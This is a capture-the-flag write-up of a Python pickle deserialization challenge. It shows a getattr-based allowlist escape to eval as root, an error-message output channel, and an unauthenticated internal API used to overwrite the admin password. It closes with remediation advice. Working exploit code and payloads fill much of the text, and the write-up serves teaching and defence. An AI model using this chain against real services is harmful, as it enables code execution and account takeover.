# 🥒 PasteFace — VuwCTF 2026

> *I heard the admin of this model-hosting site stole one of our flags and hid it somewhere on their computer. I really need it back before my boss gets angry. Please save me!*

| | |
|---|---|
| **Event** | VuwCTF 2026 |
| **Category** | Web |
| **Challenge** | paste-face |
| **Target** | `https://paste-face-<instance>.challenges.2026.vuwctf.com/` |
| **Stack** | Python 3.14.6 · Flask 3.1.3 · Werkzeug 3.1.8 · argon2-cffi · requests · 3 containers (`site` / `sandbox` / `db`) |
| **Flag** | `VuwCTF{how_sad_a_pickled_whale}` |
| **Bug classes** | CWE-502 (deserialization of untrusted data — allowlist bypass) → CWE-209 (info leak via error message) → CWE-306 (missing auth on an internal API) |

---

## Table of contents

- [TL;DR](#tldr)
- [1. Recon](#1-recon)
  - [1.1 The site](#11-the-site)
  - [1.2 The "models" are pickles](#12-the-models-are-pickles)
- [2. Probing the unpickler](#2-probing-the-unpickler)
- [3. Vulnerability 1 — `getattr` is a universal escape](#3-vulnerability-1--getattr-is-a-universal-escape)
  - [3.1 Why `random` is the wrong thing to allow](#31-why-random-is-the-wrong-thing-to-allow)
  - [3.2 Building the chain by hand](#32-building-the-chain-by-hand)
  - [3.3 Landing arbitrary `eval`](#33-landing-arbitrary-eval)
- [4. Vulnerability 2 — the error message is an output channel](#4-vulnerability-2--the-error-message-is-an-output-channel)
- [5. Post-exploitation — mapping the estate](#5-post-exploitation--mapping-the-estate)
  - [5.1 Where am I?](#51-where-am-i)
  - [5.2 The architecture doc](#52-the-architecture-doc)
  - [5.3 Reading the site's source from the wrong container](#53-reading-the-sites-source-from-the-wrong-container)
- [6. Vulnerability 3 — the db API nobody exposed](#6-vulnerability-3--the-db-api-nobody-exposed)
- [7. Getting the flag](#7-getting-the-flag)
- [8. Full exploit](#8-full-exploit)
- [9. Practical snags](#9-practical-snags)
- [10. Dead ends](#10-dead-ends)
- [11. Remediation](#11-remediation)
- [12. Takeaways](#12-takeaways)

---

## TL;DR

PasteFace is a Hugging Face parody that lets you upload a "model" — a raw Python pickle — and runs benchmarks on it. Unpickling happens in a separate `sandbox` container behind a `find_class` allowlist that blocks the usual `os.system` / `builtins.eval` gadgets.

The allowlist permits **`builtins.getattr`**, and that is the whole game. `find_class` only guards the `GLOBAL`/`STACK_GLOBAL` opcodes; `REDUCE` will happily call *any* callable already sitting on the stack. So `getattr` can be used to walk the object graph out of the sandbox:

```python
random.Random().shuffle.__globals__["__builtins__"]["eval"]
```

`shuffle` is a pure-Python method, so it carries `__globals__` — the `random` module's dict — which contains `__builtins__`, which contains `eval`. From there it's arbitrary code execution as root.

Output comes back through the sandbox's own validation error, which f-strings the deserialized object straight into the response body. The flag isn't in that container, but the internal `db` API is reachable, and its `PUT /users/admin/password/` endpoint — implemented, never exposed by the site, and completely unauthenticated — lets you set the admin password. Log in normally, `GET /admin/`, done.

```
pickle upload ─▶ getattr escape ─▶ eval as root ─▶ read app source + internal net
                                                        │
                            db API: PUT /users/admin/password/  (no auth)
                                                        │
                          log in as admin ─▶ GET /admin/ ─▶ FLAG
```

---

## 1. Recon

### 1.1 The site

The landing page is an upload form plus a feed of recent pastes.

```console
$ curl -si https://paste-face-<instance>.challenges.2026.vuwctf.com/ | head -4
HTTP/2 200
content-type: text/html; charset=utf-8
server: Werkzeug/3.1.8 Python/3.14.6
vary: Cookie
```

```html
<form action="/pastes/" enctype="multipart/form-data" method=post>
  <label for="name">Name</label>          <input type="text" name="name" id="name">
  <label for="description">Description</label> <input type="text" name="description" id="description">
  <label for="model">Model File</label>   <input type="file" name="paste.model" id="model">
  <input type="submit">
</form>
```

Six seeded pastes exist, owned by `admin`, `ML_fan` and `Guest`. There is a `/users/login` form and — notably — **no registration page**. `vary: Cookie` says sessions are in play.

Two paste pages are worth reading side by side. Paste 1 renders a results table:

```
Test results: {'The quick brown moose jumped over the lazy, grey fox.':
  [['moose', 1.0], ['elk', 0.0], ['mws', 0.0], ...]}
```

Paste 6 renders an error instead:

```
Test errors: Data is expected to be an iterable of floats or ints, found 2
```

That second string is the single most important artifact on the site: an uploaded file was deserialized into the integer `2`, and **the value came back to me in the page**. Note it for later.

### 1.2 The "models" are pickles

Every paste has a download link at `/pastes/<id>/data/`.

```console
$ curl -s .../pastes/1/data/ | xxd | head -2
00000000: 8005 9513 0000 0000 0000 005d 9428 4b01  ...........].(K.
00000010: 4b00 4b00 4b00 4b00 4b00 4b00 652e       K.K.K.K.K.K.e.
```

`\x80\x05` is a **pickle protocol 5** header. (`file(1)` unhelpfully calls this "XENIX 8086 relocatable".) Paste 1 is just `[1, 0, 0, 0, 0, 0, 0]`. Paste 6 is five bytes: `\x80\x05K\x02.` — the integer `2`, matching its error.

Paste 3, "Real ML Model Do Not Steal", is far more interesting. Disassembling it *without executing it*:

```console
$ python3 -c "import pickletools; pickletools.dis(open('paste3.bin','rb').read())" | head -20
    0: \x80 PROTO      5
   11: \x8c SHORT_BINUNICODE 'random'
   20: \x8c SHORT_BINUNICODE 'Random'
   29: \x93 STACK_GLOBAL
   31: (    MARK
   32: t        TUPLE
   33: R    REDUCE
   36: (    MARK
   46: \x8c     SHORT_BINUNICODE 'builtins'
   57: \x8c     SHORT_BINUNICODE 'getattr'
   67: \x93     STACK_GLOBAL
   ...
   91: R        REDUCE
```

This is a seeded paste that calls `random.Random()` and then `builtins.getattr` repeatedly — it fabricates a model out of random floats. Two facts fall out immediately:

1. **`REDUCE` executes.** This is not a `weights_only` loader; callables are invoked.
2. **`random.Random` and `builtins.getattr` are both reachable.** The challenge author put a working gadget chain in the seed data as a hint.

---

## 2. Probing the unpickler

I built a tiny pickle assembler rather than fighting `__reduce__`, then fired one probe per candidate gadget. Every response is echoed back to me on the paste page:

| Payload | Response |
|---|---|
| `os.system("id")` | `UnpicklingError('os.system is not allowed to be accessed during unpickling')` |
| `builtins.eval("1+1")` | `UnpicklingError('builtins.eval is not allowed ...')` |
| `builtins.exec("x=1")` | `UnpicklingError('builtins.exec is not allowed ...')` |
| `builtins.__import__("os")` | `UnpicklingError('builtins.__import__ is not allowed ...')` |
| `subprocess.check_output(["id"])` | `UnpicklingError('subprocess.check_output is not allowed ...')` |
| `builtins.open("/etc/passwd")` | `UnpicklingError('builtins.open is not allowed ...')` |
| `builtins.print("hi")` | `UnpicklingError('builtins.print is not allowed ...')` |
| **`builtins.getattr()`** | **`TypeError('getattr expected at least 2 arguments, got 0')`** |

The last row is the finding. `getattr` is not merely allowed — it *reached the call* and raised a `TypeError` from CPython itself, proving `REDUCE` invoked it with my argument tuple.

Every canonical RCE gadget is closed. One introspection primitive is open. That is enough.

---

## 3. Vulnerability 1 — `getattr` is a universal escape

Recovered later from the box, this is the guard in [`sandbox.py:12-23`](sandbox.py#L12-L23):

```python
allowed_modules = {"random", "math"}
allowed_objects = {("builtins", name) for name in ["int", "str", "list", "set", "dict", "tuple", "getattr"]}

class Unpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in allowed_modules or (module, name) in allowed_objects:
            ...
        else:
            raise pickle.UnpicklingError(f"{module}.{name} is not allowed to be accessed during unpickling")
```

The flaw is structural, not a typo. `find_class` is consulted **only** when the pickle stream names a global. It has no say over `REDUCE`, which pops a callable and a tuple off the stack and calls them. So an allowlist is only as strong as the *transitive closure* of everything reachable from the names it permits — and `getattr` makes that closure the entire interpreter.

### 3.1 Why `random` is the wrong thing to allow

A module is a namespace, and a namespace is a graph. `random` looks inert, but:

* `random.Random()` is an instance,
* `.shuffle` is a **pure-Python** bound method (unlike `.random`, which is a C builtin and a dead end),
* every Python function object exposes `__globals__` — the defining module's `__dict__`,
* every module `__dict__` contains `__builtins__`,
* and `__builtins__` contains `eval`, `exec`, `open`, `__import__`.

So the allowlist blocked `builtins.eval` by *name* while handing me a path to the identical object by *reference*. Blocklists and allowlists over names cannot survive an attacker who can traverse attributes.

Confirmed step by step against the live target:

```console
# getattr(Random(), 'shuffle')
found <bound method Random.shuffle of <random.Random object at 0x7f48efd6c430>>

# Random().shuffle.__globals__
found {'__name__': 'random', '__doc__': 'Random variable generators. ...
```

The second response is the entire `random` module dict rendered into the page.

### 3.2 Building the chain by hand

Constructing this with `pickle.dumps` and a crafted `__reduce__` is awkward because each intermediate value must itself be picklable. It's far easier to emit the bytecode directly — the full assembler is in [`solve.py:45-102`](solve.py#L45-L102):

```python
def G(mod, name):            # STACK_GLOBAL — gated by find_class
    return u(mod) + u(name) + b"\x93"

def CALL(func, *args):       # REDUCE — ungated
    return func + b"(" + b"".join(args) + b"t" + b"R"

GETATTR = G("builtins", "getattr")
RANDOM  = CALL(G("random", "Random"))

def A(obj, name):            # getattr(obj, name)
    return CALL(GETATTR, obj, const(name))

GLOBALS  = A(A(RANDOM, "shuffle"), "__globals__")
BUILTINS = CALL(A(GLOBALS, "get"), const("__builtins__"))
EVAL     = CALL(A(BUILTINS, "get"), const("eval"))
```

Note `__builtins__` here is a **dict**, not the module — inside an imported module Python stores the dict form. `getattr(d, 'eval')` fails with `AttributeError("'dict' object has no attribute 'eval'")`; you need `d.get('eval')`, which is another `getattr` + `REDUCE`. The unpickler happily calls `dict.get` because it never came from a `GLOBAL` opcode.

### 3.3 Landing arbitrary `eval`

```console
[req  361 B] found 1337                       # eval("1337")
[req  399 B] found uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),...
```

Arbitrary code execution as **root** in the sandbox container.

---

## 4. Vulnerability 2 — the error message is an output channel

RCE is worthless without a way to see results. The sandbox provides one for free, in [`sandbox.py:50-53`](sandbox.py#L50-L53):

```python
def run_code(code_bytes: bytes):
    data = safe_load(code_bytes)
    if not hasattr(data, "__iter__") or any(not isinstance(modifier, (float, int)) for modifier in data):
        return make_response(f"Data is expected to be an iterable of floats or ints, found {data}", 400)
```

The validator interpolates the deserialized object into the response with an f-string, the site stores that as `errors`, and the paste page renders it. **Anything my payload returns that isn't a numeric iterable gets `str()`'d back to me.** Failing validation is the goal, not an obstacle.

One trap: `bytes` *is* an iterable of ints, so a raw HTTP response body sails through validation and gets silently consumed as model weights — the page shows a normal scores table and you learn nothing. My first fetch of the db API looked like a success and returned no data for exactly this reason. Always `.decode()` (or `str(...)`) before returning.

---

## 5. Post-exploitation — mapping the estate

### 5.1 Where am I?

```console
$ ls -la /usr/src/app
-rwxr-xr-x  855   index.html
-rwxr-xr-x  499   login.html
-rwxr-xr-x  1042  overview.md      <-- 
-rwxr-xr-x  2648  sandbox.py
-rwxr-xr-x  4937  site.py          <-- 
-rwxr-xr-x  174   pyproject.toml
drwxr-xr-x        .venv
```

Environment variables show a Kubernetes pod, `HOSTNAME=ctf-paste-face-<instance>-...`, and — importantly — **no `FLAG`**. The flag lives in a different container.

### 5.2 The architecture doc

`overview.md` is developer notes left in the image ([`overview.md`](overview.md)):

> The service is running off of three containers, `site`, `sandbox` and `db`. `site` is exposed to the internet, but `sandbox` and `db` are both on an internal network that can be used by `site` to access the abilities of each.
>
> `sandbox` runs a simple API endpoint at `http://localhost:9998/test` that unpickles data given to it and runs some basic tests on it. It runs in a limited pickle environment to prevent the common pickle based RCE vector, but is also in its own sandbox to prevent it from messing with the site. It can make requests to the site as it's on the same internal network, but these are not special, and it can not access the internet at large.
>
> `db` runs a mostly complete REST API on `http://localhost:9999/` for paste and user information. More details can be accessed by getting the `/` endpoint, and looking at the methods available on each endpoint. **It's a bit more fully featured than what the site can handle right now, but it's being worked on!**

That last sentence is the intended nudge for stage two. The containers share a network namespace, so `localhost:9999` resolves from inside the sandbox (`db:9999` does not — `Name does not resolve`).

### 5.3 Reading the site's source from the wrong container

The sandbox is a *separate container* from the site, so its filesystem shouldn't help. Except the image is shared — `site.py` sits right there next to `sandbox.py`. Pulling it back base64-encoded (to avoid HTML mangling) gives the whole application, including the win condition at [`site.py:124-132`](site.py#L124-L132):

```python
@app.get("/admin/")
def admin():
    if session.get("user") != "admin":
        return ({"message": "Failed to authorise access to /admin/"}, 400)
    return {"flag": os.environ.get("FLAG", "VuwCTF{XXXXXXXXXXXXXXX}")}

# TODO: (17/03/2019): Add support for registration and password updates
# It's already implemented in the db so it should be pretty easy, just a few requests to the API ^-^
# I think registration should just be a POST request but I'm a bit worried as it stands...
```

The flag is an environment variable in the `site` container, gated purely on `session["user"] == "admin"`. And the author's own TODO admits the db already implements password updates.

Authentication ([`site.py:96-111`](site.py#L96-L111)) is a thin proxy — it fetches the stored hash from the db and verifies argon2 locally:

```python
resp = requests.get(f"http://localhost:9999/users/{username}/password").json()
hasher.verify(resp["password"], password)
session["user"] = username
```

So whoever controls the db controls authentication.

---

## 6. Vulnerability 3 — the db API nobody exposed

The db is unauthenticated and internal-only. `OPTIONS` enumerates what each endpoint really supports:

| Endpoint | `Allow` |
|---|---|
| `/users/` | `OPTIONS, HEAD, GET` |
| `/users/admin/` | `OPTIONS, HEAD, GET` |
| `/pastes/` | `POST, OPTIONS, HEAD, GET` |
| **`/users/admin/password/`** | **`POST, OPTIONS, PUT, HEAD, GET`** |

`GET /users/admin/` leaks the hash outright:

```json
{"password":"$argon2id$v=19$m=65536,t=3,p=4$S8cfMFfBg3wMVnnLzwpwDA$9Ckusw8k1Q7HQ4cYeK7l7sSREFZfeIaOurxrL+eCo/E"}
```

Argon2id at `m=65536,t=3,p=4` is not getting cracked in a CTF. But `PUT` on the password endpoint means I don't need to crack anything — I can overwrite it.

I tested the semantics on `ML_fan` first rather than the account I actually needed. Sending a value and reading it back shows the stored hash **differs** from what was sent, so the db hashes server-side and plaintext is the correct input:

```console
$ PUT /users/ML_fan/password/  {"password":"$argon2id$...<my own hash>..."}
b'Success'
$ GET /users/ML_fan/password/
b'{"password":"$argon2id$v=19$m=65536,t=3,p=4$D9uKqowpL/coQERQ/7nxUA$lAOhcmL..."}'   # different — re-hashed
```

Then, for real:

```console
$ PUT /users/admin/password/  {"password":"pwn12345"}
b'Success'
```

Missing authentication on an internal service (CWE-306) — the classic assumption that "internal network" means "trusted caller". The sandbox was explicitly designed to be untrusted, and it sits on that same network.

---

## 7. Getting the flag

From here it's an ordinary login from an ordinary browser — no sandbox involved:

```console
$ curl -sk -c jar -d 'username=admin&password=pwn12345' .../users/login
$ curl -sk -b jar .../admin/
{"flag":"VuwCTF{how_sad_a_pickled_whale}"}
```

```
VuwCTF{how_sad_a_pickled_whale}
```

*(A pickled whale — the Docker container you escaped.)*

---

## 8. Full exploit

[`solve.py`](solve.py) is self-contained (only needs `requests`) and runs the whole chain:

```console
$ python3 solve.py https://paste-face-<instance>.challenges.2026.vuwctf.com
[1] escaping the allowlist unpickler (getattr -> __globals__ -> eval)
    [req  361 B] Test errors: Data is expected to be an iterable of floats or ints, found 1337
    -> arbitrary eval in the sandbox container
[2] confirming code execution
    [req  399 B] ... found uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),...
[3] reaching the internal db API (localhost:9999)
    [req  486 B] ... found b'{"api_desc":"\"Paste\" resources can be found under `/pastes/` ...
[4] overwriting the admin password via the unexposed PUT endpoint
    [req  584 B] ... found b'Success'
[5] logging into the site as admin
    -> session cookie: eyJ1c2VyIjoiYWRtaW4ifQ.am3h4Q.XtfKmLXsd9FUNFsOJNZNJ0z8O9Y
[6] reading GET /admin/

FLAG: VuwCTF{how_sad_a_pickled_whale}
```

It exposes two reusable primitives:

```python
pf.ev("__import__('os').popen('id').read()")                 # eval in the sandbox
pf.request("http://localhost:9999/users/", "GET")            # HTTP from the internal network
```

**Side effect:** the exploit permanently changes the `admin` password. The original argon2 hash can be saved beforehand but *cannot* be restored through this endpoint, because the db re-hashes whatever it receives. Restart the instance for a clean state.

---

## 9. Practical snags

**A 1024-byte budget for everything.** Both Flask apps set `MAX_CONTENT_LENGTH = 1024` ([`site.py:10`](site.py#L10), [`sandbox.py:7`](sandbox.py#L7)) and the site additionally truncates with `request.files["paste.model"].read(1024)` ([`site.py:53-54`](site.py#L53-L54)). The cap applies to the **whole multipart request**, framing included, and `requests`' default multipart encoder is not frugal: with a `name` and `description` field and a 32-hex-digit boundary it spends **369 bytes** before a single byte of pickle. Hand-rolling the body with a one-character boundary, a one-character field value and no description cuts framing to **177 bytes** — raising the usable payload from ~655 to ~847 bytes. Every remote call is therefore written as a single compact expression, e.g. binding the module once with a lambda:

```python
"(lambda r: str(r.urlopen(r.Request(...), timeout=8).read()))(__import__('urllib.request').request)"
```

If more room is ever needed, uploaded models are retrievable at `/pastes/<id>/data/`, so a long payload can be staged across several pastes and reassembled by a short bootstrap — never became necessary.

**A bug in my own assembler.** Strings over 255 bytes tripped my emitter into opcode `\x8d` (`BINUNICODE8`, which takes an **8-byte** length) while I wrote a 4-byte length, producing `UnpicklingError('pickle data was truncated')` that looked exactly like hitting the size cap. The correct long-string opcode for a 4-byte length is `X` (`BINUNICODE`). Worth knowing because the symptom impersonates a completely different problem.

**Importing `argon2` kills the sandbox.** Trying to generate a hash in-container with `__import__('argon2')` returned an HTTP 500 from the *site* and took the sandbox down for roughly 60 seconds — its cffi backend doesn't survive whatever confinement the container runs under. It crashes the worker rather than raising a catchable exception, so it doesn't even show up on the error channel. It turned out to be unnecessary anyway (§6), but it costs a minute each time.

---

## 10. Dead ends

* **Cracking the argon2 hash.** `m=65536,t=3,p=4` — no.
* **Forging the session cookie.** [`site.py:11`](site.py#L11) falls back to `app.secret_key = "dev"` if `SESSION_SECRET_KEY` is unset, which would let you sign `{"user":"admin"}` yourself and skip stages 1–3 entirely. I checked the live cookie against the `"dev"` key and it fails verification (`BadTimeSignature`) — the variable is set in production, so this path is closed. Always worth 30 seconds to test.
* **Registration.** `POST /users/` on the db returns `405`; user resources are `GET`-only. Only the *password* sub-resource is writable — and since `/admin/` compares against the literal string `admin`, creating a new user wouldn't have helped regardless.
* **`db:9999` by hostname.** `URLError(gaierror(-2, 'Name does not resolve'))`. The containers share a network namespace; `localhost` is correct.
* **Port 9967 from outside.** The description says to connect with `openssl s_client -connect <host>:9967`. That's the port Flask binds *inside* the container ([`site.py:141`](site.py#L141)); externally the instance is fronted by ordinary HTTPS on 443, and 9967 simply times out. The plain URL is all you need — the note appears to be boilerplate from the event's pwn challenges.
* **Trailing slashes.** The db `308`-redirects sub-resources, and `urllib`'s `HTTPRedirectHandler` follows a 308 only for `GET`/`HEAD` — for `PUT` or `OPTIONS` it raises `HTTPError 308` instead. So `/users/admin/password` dies where `/users/admin/password/` works, and the failure looks like a missing endpoint rather than a redirect.

---

## 11. Remediation

**Don't deserialize untrusted pickles — at all.** No allowlist makes `pickle` safe; the format is a stack machine with a call instruction. Use a data format that doesn't execute: JSON, or `safetensors` for real model weights. If a Python object graph is genuinely required, sign it and verify the signature before loading.

**If you must allowlist, allowlist objects, not names, and never `getattr`.** `getattr` (and `__reduce__`-reachable equivalents like `operator.attrgetter`, `functools.reduce`, `dict.get`) turns a name allowlist into a full-interpreter allowlist. Also recognise that permitting a *module* permits the transitive closure of everything reachable through it — `random` alone is enough, via `__globals__`.

**Never interpolate deserialized data into responses.** [`sandbox.py:53`](sandbox.py#L53) turns a validation message into a general-purpose exfiltration channel. Log the detail server-side; return a static string:

```python
return make_response("Data must be an iterable of floats or ints", 400)
```

**Authenticate internal APIs.** The db has no auth because it's "on an internal network" — a network that by design also hosts a container running attacker-supplied code. The sandbox should have no route to the db at all (network policy), and the db should still require a credential the sandbox doesn't hold. Defence in depth: either control alone would have stopped stage two.

**Don't ship the app's source and architecture notes into the sandbox image.** `site.py` and `overview.md` handed over the win condition and the internal port map. Build a minimal image per service.

**Isolate for real.** Root inside the sandbox, a shared network namespace, and a shared image made "its own sandbox" mostly nominal. Run as a non-root user, apply seccomp, drop capabilities, and deny egress by default.

---

## 12. Takeaways

1. **`find_class` guards one opcode, not the format.** The mental model "I restricted `find_class`, so pickle is safe" is the root cause here. `REDUCE` calls anything already on the stack, and objects reached by attribute traversal never pass through `find_class` at all.
2. **Introspection primitives are RCE primitives.** `getattr` reads like a harmless accessor next to `eval` or `system`. In a sandbox it's strictly more dangerous, because it reaches *every* other primitive without ever naming one.
3. **Verbose errors are a protocol.** The single most useful capability in this chain wasn't the code execution — it was the f-string in the validator that echoed objects back. RCE with no output channel is a much harder challenge.
4. **Seed data is documentation.** Paste 3 shipped a working `random` + `getattr` chain. Disassembling the sample files with `pickletools.dis` (which never executes) pointed at the intended solution before any payload was written.
5. **Test destructive operations on a spare target.** Probing the password endpoint against `ML_fan` first revealed that the db re-hashes input — learning that on `admin` with a bad guess about the format could have locked the account into an unknown state mid-solve.
